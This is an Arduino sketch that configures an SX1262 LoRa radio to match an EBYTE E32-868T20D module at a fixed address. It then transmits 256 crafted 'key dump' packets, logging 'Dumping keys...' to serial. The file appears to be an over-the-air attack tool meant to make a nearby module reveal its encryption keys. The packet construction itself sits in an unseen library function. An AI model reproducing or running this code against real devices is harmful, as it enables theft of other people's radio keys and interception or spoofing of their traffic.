#include <Arduino.h>
#include <axp20x.h>
#include <RadioLib.h>
#include <E32-868T20D.h>

// -------------------------- Configuration -------------------------- //

#define LORA_CS_PIN                 18
#define LORA_DIO1_PIN               33
#define LORA_RST_PIN                23
#define LORA_BUSY_PIN               32

// EBYTE E32-868T20D parameters
#define E32_CHANNEL                 0x09
#define E32_ADDRESS                 0x1310
#define E32_BASE_FREQUENCY_MHZ      862
#define E32_BANDWIDTH_KHZ           500
#define E32_SPREADING_FACTOR        11
#define E32_CODING_RATE_DENOM       5

// ------------------------------------------------------------------- //

AXP20X_Class pmu;
SX1262 lora = new Module(LORA_CS_PIN, LORA_DIO1_PIN, LORA_RST_PIN, LORA_BUSY_PIN);
E32_868T20D e32;

void beginPMU() {
	Wire.begin();
	pmu.begin(Wire, AXP192_SLAVE_ADDRESS);
	pmu.setPowerOutPut(AXP192_DCDC1, AXP202_OFF);	// GPIO Pins Power Source
	pmu.setPowerOutPut(AXP192_DCDC2, AXP202_OFF);	// Unused
	pmu.setPowerOutPut(AXP192_LDO2, AXP202_OFF);	// LoRa Power Source
	pmu.setPowerOutPut(AXP192_LDO3, AXP202_OFF);	// GPS Power Source
    pmu.setPowerOutPut(AXP192_EXTEN, AXP202_OFF);	// External Connector Power Source
}

void beginLora() {
	pmu.setLDO2Voltage(3300);
	pmu.setPowerOutPut(AXP192_LDO2, AXP202_ON);
	lora.begin(E32_BASE_FREQUENCY_MHZ + E32_CHANNEL, E32_BANDWIDTH_KHZ, E32_SPREADING_FACTOR, E32_CODING_RATE_DENOM);
}

void setup() {
    Serial.begin(115200);
    beginPMU();
    beginLora();

    Serial.println("Dumping keys...");
    uint8_t packet[64];
    size_t len;
    for (int i = 0; i <= 0xFF; i++) {
        e32.generateKeyDumpPacket(E32_ADDRESS, (uint8_t)i, packet, &len);
        lora.transmit(packet, len);
        Serial.print("Completed: ");
        Serial.print(i+1); Serial.print("/"); Serial.println(256);
        delay(100);
    }
    Serial.println("Done!");
}

void loop() {}
